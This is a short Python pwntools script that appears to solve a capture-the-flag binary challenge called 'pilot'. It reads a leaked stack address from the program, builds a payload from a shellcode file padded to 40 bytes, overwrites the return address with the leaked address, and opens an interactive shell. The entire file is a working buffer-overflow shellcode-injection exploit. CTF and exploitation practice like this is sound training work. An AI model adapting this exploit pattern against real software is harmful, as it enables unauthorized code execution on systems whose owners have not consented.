from pwn import *

context.clear(arch='amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']

io = process('./pilot')

e = ELF('./pilot')

print(io.recvuntil("[*]Location:"))
leak = io.recvline()

input_address = int(leak.strip(b"\n"), 16)

payload = open("../../payloads/shellcode64/payload", mode="rb").read()
payload += b"0"*(40 - len(payload))
payload += pack(input_address, 64, 'little')

io.sendline(payload)
io.interactive()
